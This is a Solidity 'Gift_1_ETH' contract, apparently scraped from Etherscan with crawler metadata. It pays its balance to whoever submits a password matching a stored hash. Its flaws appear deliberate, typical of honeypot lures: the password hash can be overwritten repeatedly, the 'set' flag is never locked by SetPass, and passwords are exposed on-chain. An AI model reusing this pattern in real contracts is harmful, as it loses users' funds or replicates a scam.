//token_name	
//token_url	https://etherscan.io//address/0xd6bc92a0f5a2bc17207283679c5ddcc108fd3710#code
//spider_time	2018/07/08 12:45:18
//token_Transactions	9 txns
//token_price	

pragma solidity ^0.4.19;

contract Gift_1_ETH
{
    bool passHasBeenSet = false;
    
    function()payable{}
    
    function GetHash(bytes pass) constant returns (bytes32) {return sha3(pass);}
    
    bytes32 public hashPass;
    
    function SetPass(bytes32 hash)
    public
    payable
    {
        if(!passHasBeenSet&&(msg.value >= 1 ether))
        {
            hashPass = hash;
        }
    }
    
    function GetGift(bytes pass)
    external
    payable
    {
        if(hashPass == sha3(pass))
        {
            msg.sender.transfer(this.balance);
        }
    }
    
    function PassHasBeenSet(bytes32 hash)
    public
    {
        if(hash==hashPass)
        {
           passHasBeenSet=true;
        }
    }
}